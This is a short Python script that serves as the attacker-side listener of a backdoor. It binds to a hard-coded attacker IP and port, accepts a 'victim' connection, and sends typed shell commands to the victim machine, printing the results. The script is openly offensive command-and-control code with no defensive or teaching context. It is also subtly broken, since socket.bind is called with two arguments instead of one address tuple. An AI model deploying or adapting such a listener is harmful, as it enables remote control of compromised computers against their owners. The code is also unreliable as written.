import socket

attackerIP = '10.10.0.6'
attackerPort = 4443

server = socket.socket()
server.bind(attackerIP,attackerPort)
print("[+]Server Started")
print("[+]Listening for victims connections!")
server.listen(1)

victim, victimAddress = server.accept()
print(f'[+]{victimAddress} opened the backdoor! or malware!')

while True:
    cmd = input('Enter command: ')
    cmd = cmd.encode()
    victim.send(cmd)
    output = victim.recv(1024)
    output = output.decode()
    print(f'[+]Command output:\n{output}')
